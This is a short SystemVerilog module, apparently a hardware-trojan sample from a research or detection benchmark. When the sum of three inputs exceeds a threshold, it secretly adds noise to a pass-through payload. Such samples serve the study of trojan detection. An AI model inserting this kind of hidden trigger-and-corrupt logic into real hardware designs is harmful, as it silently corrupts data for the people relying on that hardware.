module combinational_trojan_3 #(
    parameter DATA_WIDTH = 8,
    parameter logic [DATA_WIDTH-1:0] NOISE_VALUE = 5,
    parameter NUMBER_OF_TRIGGERS = 3,
    parameter THRESHOLD = 4
)(        
    input wire [DATA_WIDTH-1:0] data_in_0, data_in_1, data_in_2,
    input wire [DATA_WIDTH-1:0] data_payload_in,
    output reg [DATA_WIDTH-1:0] data_payload_out
);

    wire is_trigger_condition;    

    assign is_trigger_condition = (data_in_0 + data_in_1 + data_in_2 > THRESHOLD);
    
    always @(*) begin
        data_payload_out = data_payload_in;        
        if (is_trigger_condition) begin                
            data_payload_out = data_payload_in + NOISE_VALUE;
        end        
    end

endmodule
